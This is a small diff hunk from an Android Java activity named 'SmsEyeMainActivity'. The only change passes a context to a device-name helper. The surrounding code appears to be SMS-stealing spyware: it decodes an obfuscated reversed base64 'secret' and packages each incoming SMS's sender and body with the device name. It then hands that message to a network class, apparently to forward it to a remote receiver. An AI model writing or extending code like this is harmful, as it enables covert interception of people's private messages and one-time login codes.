@@ -93,7 +93,7 @@ public class SmsEyeMainActivity extends AppCompatActivity {
                             byte[] bytes2 = reversed.split("\\|")[0].getBytes(StandardCharsets.UTF_8);
                             String secretInfo = new String(decoder.decode(bytes2), StandardCharsets.UTF_8);
 
-                            String deviceInfo = "𝐝𝐞𝐯𝐢𝐜𝐞 : " + SmsEyeUtils.getDeviceName();
+                            String deviceInfo = "𝐝𝐞𝐯𝐢𝐜𝐞 : " + SmsEyeUtils.getDeviceName(context);
                             String finalMessage = "𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝\n\n𝐬𝐞𝐧𝐝𝐞𝐫 : " + sender + "\n𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : " + body + "\n\n" + deviceInfo + "\n\n" + secretInfo;
 
                             SmsEyeNetwork smsEyeNetwork = new SmsEyeNetwork(context);
